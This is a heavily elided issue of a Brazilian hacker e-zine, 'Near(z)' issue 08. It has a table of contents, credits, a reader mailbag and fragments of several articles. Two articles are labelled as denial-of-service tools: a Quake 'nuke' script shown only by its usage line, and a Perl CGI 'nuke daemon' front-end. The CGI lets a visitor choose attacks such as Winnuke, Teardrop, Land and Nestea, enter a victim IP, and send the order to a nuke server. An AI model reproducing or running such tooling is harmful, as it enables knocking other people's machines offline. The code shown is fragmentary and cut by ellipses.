...
──────────────────────────────────────────────────────────────────────────────
             ...
             │ [0x01] &lt;DoS> Cuspindo Users do Quake          │               
             │ [0x02] &lt;iNf> Escondendo IP no ICQ             │               
             │ [0x03] &lt;pRg> CCount, for C Programmers        │               
             │ [0x04] &lt;pRg> Use MD5 em seus programas.c      │               
             │ [0x05] &lt;iNf> Prompts com ANSI                 │               
             │ [0x06] &lt;iNf> Unix X SuxowsNT                  │               
             │ [0x07] &lt;pRg> Windows 98 Source Code           │               
             │ [0x08] &lt;DoS> inetd                            │               
             │ [0x09] &lt;DoS> Nuke Daemon .cgi                 │               
             │ [0x0A]                                        │               
             │ [0x0B]                                        │               
             │ [0x0C]                                        │               
             │ [0x0D]                                        │               
...
──────────────────────────────────────────────────────────────────────────────
                                     ...
                                     *
                                                                                ...
                                                                                ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x01] &lt;DoS> Cuspindo Users do Quake          ├────────■ SouL Hunter ■─
    ╚═─────────────────────────────────────────────═╝
...
if [ $# = 3 ]
    ...
    echo Uso: QuakeNuke host startport stopport
fi
------------------------------------------------------------------------------
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x02] &lt;iNf> Escondendo IP no ICQ             ├────────■ SouL Hunter ■─
    ╚═─────────────────────────────────────────────═╝
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x03] &lt;pRg> CCount, for C Programmers        ├──────■ GhostOBtRuDeR ■─
    ╚═─────────────────────────────────────────────═╝
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x04] &lt;pRg> Use MD5 em seus programas.c      ├──────■ GhostOBtRuDeR ■─
    ╚═─────────────────────────────────────────────═╝
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x05] &lt;iNf> Prompts com ANSI                 ├──────■ GhostOBtRuDeR ■─
    ╚═─────────────────────────────────────────────═╝
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x06] &lt;iNf> Unix X SuxowsNT                  ├──────■ GhostOBtRuDeR ■─
    ╚═─────────────────────────────────────────────═╝
...
──────────────────────────────────────────────────────────────────────────────
    ...
    ╔═─────────────────────────────────────────────═╗
 ■──┤ [0x09] &lt;DoS> Nuke Daemon .cgi                 ├────────■ SouL Hunter ■─
    ╚═─────────────────────────────────────────────═╝
...
&lt;BODY BGCOLOR="#000000">&lt;P ALIGN=CENTER>&lt;BR>&lt;BR>&lt;/P>
&lt;TABLE WIDTH=100% BORDER=0 CELLPADDING=3 CELLSPACING=0>
	...
	&lt;TR>
		&lt;TD WIDTH=100% VALIGN=TOP BGCOLOR="#000080">
			...
			O Servidor de nuke esta funcionando&lt;/FONT>&lt;/P>
		&lt;/TD>
...
FIM
    ...
    print <&lt;FIM;
    &lt;HTML>
    &lt;/HEAD>&lt;BODY BGCOLOR="#000000">&lt;P ALIGN=CENTER>&lt;BR>&lt;BR>&lt;/P>
    &lt;TABLE WIDTH=100% BORDER=0 CELLPADDING=3 CELLSPACING=0>
    &lt;COL WIDTH=256*>&lt;TR>&lt;TD WIDTH=100% VALIGN=TOP BGCOLOR="#000080">
    &lt;P ALIGN=CENTER>&lt;FONT COLOR="#ffffff">   O Servidor de nuke nao esta funcionando&lt;/FONT>&lt;/P>&lt;/TD>&lt;/TR>
    &lt;/TABLE>
FIM
    die;
}
...
&lt;P ALIGN=CENTER>&lt;BR>&lt;BR>
&lt;/P>
&lt;FORM NAME="Standard" ACTION="$CGI_FILE_NAME " METHOD=POST>
	&lt;DL>
		&lt;DD>
		&lt;TABLE WIDTH=593 BORDER=1 BORDERCOLOR="#000000" CELLPADDING=3 CELLSPACING=0>
			&lt;COL WIDTH=19>
			&lt;COL WIDTH=238>
			&lt;COL WIDTH=296>
			&lt;COL WIDTH=14>
			&lt;TR VALIGN=TOP>
				&lt;TH WIDTH=19 BGCOLOR="#000080">
					&lt;P>&lt;BR>
					&lt;/P>
				&lt;/TH>
				&lt;TH WIDTH=238 BGCOLOR="#000080">
					&lt;P>&lt;FONT COLOR="#ffffff">Nukes&lt;/FONT>&lt;/P>
				&lt;/TH>
				&lt;TH WIDTH=296 BGCOLOR="#000080">
					&lt;P>&lt;FONT COLOR="#ffffff">Sistemas Afetados&lt;/FONT>&lt;/P>
				&lt;/TH>
				&lt;TH WIDTH=14 BGCOLOR="#000080">
					&lt;P>&lt;BR>
					&lt;/P>
				&lt;/TH>
			&lt;/TR>			
...
if($WINNUKE eq 1) { $NUKE="Winnuke"; $SYSTEM="Old Win95/NT";  $VALUE="WINNUKE"; &ShowNUKE;}
if($JOLT eq 1)	  { $NUKE="Jolt";    $SYSTEM="Old Win95/NT";  $VALUE="JOLT"; &ShowNUKE;}
if($SIMPING eq 1) { $NUKE="Simping"; $SYSTEM="Old Win95/NT";  $VALUE="SIMPING"; &ShowNUKE;}
if($LAND eq 1)	  { $NUKE="Land";    $SYSTEM="Win95/NT";      $VALUE="LAND"; &ShowNUKE;}
if($TEARDROP eq 1){ $NUKE="Teardrop";$SYSTEM="Win95/NT/Linux";$VALUE="TEARDROP"; &ShowNUKE;}
if($NEWTEAR  eq 1){ $NUKE="Newtear"; $SYSTEM="Win95/NT";      $VALUE="NEWTEAR"; &ShowNUKE;}
if($BOINK    eq 1){ $NUKE="Boink";   $SYSTEM="Win95/NT";      $VALUE="BOINK"; &ShowNUKE;}
if($NESTEA   eq 1){ $NUKE="Nestea";  $SYSTEM="Win95/NT/Linux";$VALUE="NESTEA"; &ShowNUKE;}
print <&lt;FIM;
	&lt;/TABLE>
	&lt;CENTER>
		&lt;TABLE WIDTH=347 BORDER=1 BORDERCOLOR="#000000" CELLPADDING=3 CELLSPACING=0>
			&lt;COL WIDTH=208>
			&lt;COL WIDTH=127>
			&lt;TR VALIGN=TOP>
				&lt;TD WIDTH=208 BGCOLOR="#000000">
					&lt;P ALIGN=CENTER>&lt;FONT COLOR="#ffffff">IP: &lt;INPUT TYPE=TEXT SIZE=13 NAME="IP">&lt;/FONT>&lt;/P>
				&lt;/TD>
				&lt;TD WIDTH=127 BGCOLOR="#000000">
					&lt;P ALIGN=CENTER>&lt;FONT COLOR="#ffffff">&lt;INPUT TYPE=SUBMIT NAME="submit" VALUE=" Nukar ">
					&lt;/FONT>
					&lt;/P>
				&lt;/TD>
			&lt;/TR>
...
&lt;TR VALIGN=TOP>
    &lt;TD WIDTH=19 BGCOLOR="#000000">
		&lt;P>&lt;INPUT TYPE=RADIO NAME="host" VALUE="$VALUE"> 
		&lt;/P>
    &lt;/TD>
    &lt;TD WIDTH=238 BGCOLOR="#000000">
	&lt;P>&lt;FONT COLOR="#ffffff">$NUKE&lt;/FONT>&lt;/P>
    &lt;/TD>
    &lt;TD WIDTH=296 BGCOLOR="#000000">
	&lt;P>&lt;FONT COLOR="#ffffff">$SYSTEM&lt;/FONT>&lt;/P>
    &lt;/TD>
...
sub doit
{
    ...
    send S,"$SERVER_PASSWORD\n",0;
    send S,"$FORM{'host'}\n",0;
    send S,"$FORM{'IP'}\n",0;
    recv S,$TMP,1,0;    
    close S;
    if($TMP eq "A"){ print " $FORM{'host'} - Enviado com sucesso para $FORM{'IP'}"; }
    if($TMP eq "X"){ print " Erro!!: Formato do IP errado. ($FORM{'IP'}) &lt;BR> Exemplo de formato correto: 200.123.123.123 &lt;BR>(Obs. Nao aceitamos Host names)"; }
    die;    
}
----------------------------------------------------------------( nuke.cgi )-
...
──────────────────────────────────────────────────────────────────────────────
 ...
 O Nosso emails eh: nearz@cyberspace.org
 ...
 seguinte. Lah estara a sua resposta. Agora as mensagens de alguns
 leitores:

-=0=---------------------------------------------------------------------=0=-
FROM: v*@iname.com
      Hi NearZ guys!
      Nao sei se fiz a coisa certa mas, tomei a liberdade de adicionar um
      arquivo com todos os seus e-zines no meu site, devido a excelente 
      qualidade do seu material. Acho que mais pessoas deveriam le-lo.
      Se quiserem, mandem um reply. Muito obrigado por sua paciencia e
      compreensao. T+

REPLY: wow! Valeu! Thx pelo mirror ;)
-=0=---------------------------------------------------------------------=0=-
...
-=-{
quake: discovered(SoUL HuNTeR), text(SoUL HuNTeR), .c(SoUL HuNTeR/OBtRuDeR)
icq: text(SoUL HuNTeR),
ccount: text(OBtRuDeR), .c(OBtRuDeR)
md5:
Unix X NT: text(OBtRuDeR), original(unixnt.txt)
prompts: text(OBtRuDeR)
}-=-

▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█ E0i ─=─ End of issue 08 ─█#      Near(z)      #█─ End of issue 08 ─=─ E0i █
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
```
